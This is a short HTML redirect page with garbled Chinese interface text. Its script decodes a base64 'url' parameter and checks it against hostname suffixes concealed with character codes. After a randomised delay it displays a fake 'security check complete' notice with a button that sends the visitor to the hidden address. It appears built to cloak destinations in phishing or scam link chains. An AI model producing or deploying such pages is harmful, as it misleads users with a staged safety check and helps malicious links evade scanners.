<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="referrer" content="no-referrer">
  <title>ÂÆâÂÖ®Ë∑≥ËΩâ</title>
  <style>
    #load {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(255, 255, 255, 0.95);
      display: flex; justify-content: center; align-items: center;
      z-index: 9999; flex-direction: column; text-align: center;
      font-family: sans-serif;
    }
    .kz { display: flex; gap: 12px; margin-bottom: 16px; }
    .pz { width: 16px; height: 16px; border-radius: 50%; animation: xb 0.6s infinite alternate; }
    .pz:nth-child(1){ background:#e91e63; animation-delay:0s;}
    .pz:nth-child(2){ background:#2196f3; animation-delay:.2s;}
    .pz:nth-child(3){ background:#f9d402; animation-delay:.4s;}
    @keyframes xb {from{transform:translateY(0);opacity:.6;} to{transform:translateY(-15px);opacity:1;}}
    #prompt { display:none; font-size:16px; color:#333; }
    #continueBtn {
      margin-top:12px; padding:8px 20px; font-size:15px;
      background:#2196f3; color:#fff; border:none; border-radius:6px; cursor:pointer;
      box-shadow:0 2px 6px rgba(0,0,0,0.2);
    }
    #continueBtn:hover { background:#1976d2; }
  </style>
</head>
<body>
  <div id="load">
    <div class="kz">
      <div class="pz"></div>
      <div class="pz"></div>
      <div class="pz"></div>
    </div>
    <div id="prompt"></div>
  </div>

  <script>
    (function(){
      function g(p){return new URLSearchParams(window.location.search).get(p);}
      function c(u){
        try{
          var h=(new URL(u)).hostname.toLowerCase();
          var s1=String.fromCharCode(103,105,116,104,117,98,46,105,111); // github.io
          var s2=String.fromCharCode(46,115,107,105,110);               // .skin
          return h.endsWith(s1)||h.endsWith(s2);
        }catch(e){return false;}
      }
      var r=g('url');
      var prompt=document.getElementById('prompt');
      if(r){
        try{
          var t=atob(r);
          if(c(t)){
            setTimeout(function(){
              prompt.style.display='block';
              prompt.innerHTML='üîí ÂÆâÂÖ®Ê™¢Ê∏¨ÂÆåÊàê<br><button id="continueBtn">üëâ ÈªûÊìäÁπºÁ∫å</button>';
              document.getElementById('continueBtn').onclick=function(){
                window.location.href=t;
              };
            },2000+Math.random()*1000);
          }else{
            prompt.style.display='block';
           
          }
        }catch(e){
          prompt.style.display='block';
         
        }
      }else{
        prompt.style.display='block';
      
      }
    })();
  </script>
</body>
</html>
